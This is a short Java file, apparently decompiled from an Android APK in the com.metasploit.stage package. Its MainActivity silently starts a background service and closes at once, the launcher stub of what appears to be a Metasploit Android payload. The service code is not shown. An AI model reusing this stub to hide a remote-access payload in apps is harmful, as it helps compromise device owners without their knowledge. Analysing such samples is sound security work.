package com.metasploit.stage;

import android.app.Activity;
import android.os.Bundle;
/* loaded from: classes.dex */
public class MainActivity extends Activity {
    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        MainService.startService(this);
        finish();
    }
}
